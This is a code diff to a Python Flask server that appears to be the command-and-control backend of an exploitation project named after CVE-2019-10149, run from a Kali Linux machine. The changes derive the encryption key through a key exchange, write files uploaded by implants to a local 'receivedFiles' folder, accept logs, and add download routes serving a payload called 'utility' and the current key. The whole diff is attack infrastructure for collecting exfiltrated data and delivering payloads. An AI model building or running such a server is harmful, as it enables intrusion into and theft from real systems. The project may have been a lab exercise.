@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 import base64
 import json
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -25,13 +25,13 @@ def generate_params():
 
     return parameters, private_key, public_key
 
-def generate_key():
-    key = os.urandom(BLOCK_SIZE)
-    with open(key_path, 'wb') as f:
-        f.write((key))
-    return (key)
+# def generate_key():
+#     key = os.urandom(BLOCK_SIZE)
+#     with open(key_path, 'wb') as f:
+#         f.write((key))
+#     return (key)
 
-KEY = generate_key()
+KEY = None
 
 # function that does AES encryption and then obfuscation
 def do_everything(data):
@@ -136,6 +136,8 @@ def xchg_secrets():
         info=b'KEYAES',
     ).derive(shared_secret)
 
+    global KEY
+    KEY = server_derived_key
     return server_public_bytes
 
 ## KEY EXCHANGE RELATED STUFF
@@ -157,7 +159,7 @@ def upload():
             file_data = base64.b64decode(file_data)
 
             file_name = decrypted_data["file_name"]
-            file_path = os.path.join("./receivedFiles", file_name)
+            file_path = os.path.join("/home/kali/Desktop/receivedFiles/", file_name)
             try:
                 with open(file_path, "wb") as f:
                     f.write(file_data)
@@ -197,6 +199,14 @@ def log():
         return jsonify({"status": "log received"}), 200
     else:
         return jsonify({"status": "no log data received"}), 400
+        
+@app.route("/utility")
+def serve_file():
+    return send_from_directory("/home/kali/Desktop/CVE-2019-10149", "utility", as_attachment=True)
+    
+@app.route("/key")
+def serve_key():
+    return send_from_directory("/home/kali/Desktop/CVE-2019-10149/C2Server", "cur_key.txt", as_attachment=True);
 
 if __name__ == '__main__':
     # Run over HTTPS with cert.pem and key.pem in the same directory.
